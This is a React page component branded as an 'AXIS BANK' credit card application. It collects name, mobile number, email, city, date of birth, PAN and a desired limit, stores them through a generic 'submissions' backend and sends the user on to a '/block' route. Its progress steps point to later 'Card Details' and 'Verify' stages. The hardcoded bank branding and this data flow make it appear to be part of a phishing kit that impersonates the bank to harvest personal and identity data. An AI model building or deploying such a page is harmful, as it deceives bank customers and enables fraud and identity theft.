import { Link, useNavigate } from "react-router";
import { useState } from "react";
import { trpc } from "@/providers/trpc";
import {
  User,
  Phone,
  Mail,
  MapPin,
  Calendar,
  CreditCard,
  IndianRupee,
  ArrowLeft,
  ArrowRight,
} from "lucide-react";

export default function Apply() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    fullName: "",
    mobile: "",
    email: "",
    city: "",
    dob: "",
    pan: "",
    cardLimit: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const createSubmission = trpc.submissions.create.useMutation({
    onSuccess: (data) => {
      sessionStorage.setItem("submissionId", String(data.id));
      sessionStorage.setItem("applyData", JSON.stringify(formData));
      navigate("/block");
    },
    onError: () => {
      alert("Failed to save. Please try again.");
    },
  });

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.fullName.trim()) newErrors.fullName = "Name is required";
    if (!formData.mobile.trim() || !/^\d{10}$/.test(formData.mobile))
      newErrors.mobile = "Valid 10-digit mobile required";
    if (!formData.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email))
      newErrors.email = "Valid email required";
    if (!formData.city.trim()) newErrors.city = "City is required";
    if (!formData.dob.trim()) newErrors.dob = "DOB is required";
    if (!formData.pan.trim() || !/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(formData.pan))
      newErrors.pan = "Valid PAN required (ABCDE1234F)";
    if (!formData.cardLimit.trim()) newErrors.cardLimit = "Limit is required";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    createSubmission.mutate({
      type: "Apply Card",
      fullName: formData.fullName,
      mobile: formData.mobile,
      email: formData.email,
      city: formData.city,
      dob: formData.dob,
      pan: formData.pan.toUpperCase(),
      cardLimit: formData.cardLimit,
    });
  };

  const inputClass = (field: string) =>
    `w-full pl-10 pr-4 py-3 border rounded-lg outline-none transition-all ${
      errors[field]
        ? "border-red-400 focus:border-red-500 focus:ring-2 focus:ring-red-100"
        : "border-gray-200 focus:border-[#96144c] focus:ring-2 focus:ring-[#96144c]/10"
    }`;

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#96144c] px-4 sm:px-6 py-4 flex items-center justify-between shadow-md">
        <Link to="/" className="text-white text-xl font-bold tracking-wider">
          AXIS BANK
        </Link>
        <Link
          to="/"
          className="flex items-center gap-2 bg-white text-[#96144c] px-4 py-2 rounded-lg font-semibold text-sm hover:bg-white/90 transition-all"
        >
          <ArrowLeft size={16} /> Back
        </Link>
      </header>

      <div className="max-w-3xl mx-auto px-4 py-8 sm:py-12">
        {/* Progress */}
        <div className="flex items-center justify-center gap-2 mb-8">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-[#96144c] text-white rounded-full flex items-center justify-center text-sm font-bold">
              1
            </div>
            <span className="text-sm font-semibold text-[#96144c]">Apply</span>
          </div>
          <div className="w-12 h-0.5 bg-gray-300" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gray-300 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
              2
            </div>
            <span className="text-sm text-gray-400">Card Details</span>
          </div>
          <div className="w-12 h-0.5 bg-gray-300" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gray-300 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">
              3
            </div>
            <span className="text-sm text-gray-400">Verify</span>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
          <div className="bg-[#96144c] px-6 py-4">
            <h2 className="text-white text-center text-lg font-semibold">
              Fill in your details below
            </h2>
          </div>

          <form onSubmit={handleSubmit} className="p-6 sm:p-8">
            <div className="grid sm:grid-cols-2 gap-5">
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Full Name
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="Enter your full name"
                    className={inputClass("fullName")}
                    value={formData.fullName}
                    onChange={(e) =>
                      setFormData({ ...formData, fullName: e.target.value })
                    }
                  />
                </div>
                {errors.fullName && (
                  <p className="text-red-500 text-xs mt-1">{errors.fullName}</p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Mobile Number
                </label>
                <div className="relative">
                  <Phone className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="tel"
                    placeholder="Enter 10 digit mobile"
                    maxLength={10}
                    className={inputClass("mobile")}
                    value={formData.mobile}
                    onChange={(e) =>
                      setFormData({ ...formData, mobile: e.target.value.replace(/\D/g, "") })
                    }
                  />
                </div>
                {errors.mobile && (
                  <p className="text-red-500 text-xs mt-1">{errors.mobile}</p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Email Address
                </label>
                <div className="relative">
                  <Mail className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="email"
                    placeholder="Enter your email"
                    className={inputClass("email")}
                    value={formData.email}
                    onChange={(e) =>
                      setFormData({ ...formData, email: e.target.value })
                    }
                  />
                </div>
                {errors.email && (
                  <p className="text-red-500 text-xs mt-1">{errors.email}</p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  City
                </label>
                <div className="relative">
                  <MapPin className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="Enter your city"
                    className={inputClass("city")}
                    value={formData.city}
                    onChange={(e) =>
                      setFormData({ ...formData, city: e.target.value })
                    }
                  />
                </div>
                {errors.city && (
                  <p className="text-red-500 text-xs mt-1">{errors.city}</p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Date of Birth
                </label>
                <div className="relative">
                  <Calendar className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="DD/MM/YYYY"
                    className={inputClass("dob")}
                    value={formData.dob}
                    onChange={(e) =>
                      setFormData({ ...formData, dob: e.target.value })
                    }
                  />
                </div>
                {errors.dob && (
                  <p className="text-red-500 text-xs mt-1">{errors.dob}</p>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  PAN Number
                </label>
                <div className="relative">
                  <CreditCard className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="ABCDE1234F"
                    maxLength={10}
                    className={inputClass("pan")}
                    value={formData.pan}
                    onChange={(e) =>
                      setFormData({ ...formData, pan: e.target.value.toUpperCase() })
                    }
                  />
                </div>
                {errors.pan && (
                  <p className="text-red-500 text-xs mt-1">{errors.pan}</p>
                )}
              </div>

              <div className="sm:col-span-2">
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">
                  Desired Card Limit (₹)
                </label>
                <div className="relative">
                  <IndianRupee className="absolute left-3 top-3 text-[#96144c]" size={18} />
                  <input
                    type="text"
                    placeholder="Enter desired limit (e.g. 100000)"
                    className={inputClass("cardLimit")}
                    value={formData.cardLimit}
                    onChange={(e) =>
                      setFormData({ ...formData, cardLimit: e.target.value.replace(/\D/g, "") })
                    }
                  />
                </div>
                {errors.cardLimit && (
                  <p className="text-red-500 text-xs mt-1">{errors.cardLimit}</p>
                )}
              </div>
            </div>

            <button
              type="submit"
              disabled={createSubmission.isPending}
              className="w-full mt-6 bg-[#96144c] text-white py-3.5 rounded-xl font-bold text-base hover:shadow-lg hover:-translate-y-0.5 transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {createSubmission.isPending ? (
                "Processing..."
              ) : (
                <>
                  Continue <ArrowRight size={18} />
                </>
              )}
            </button>

            <p className="text-center text-xs text-gray-400 mt-4">
              By continuing, you agree to our{" "}
              <a href="#" className="text-[#96144c] font-semibold">
                Terms & Conditions
              </a>
            </p>
          </form>
        </div>
      </div>

      <footer className="bg-gray-900 text-white text-center py-4 mt-auto">
        <p className="text-sm opacity-60">&copy; 2026 Axis Bank Ltd. All rights reserved.</p>
      </footer>
    </div>
  );
}
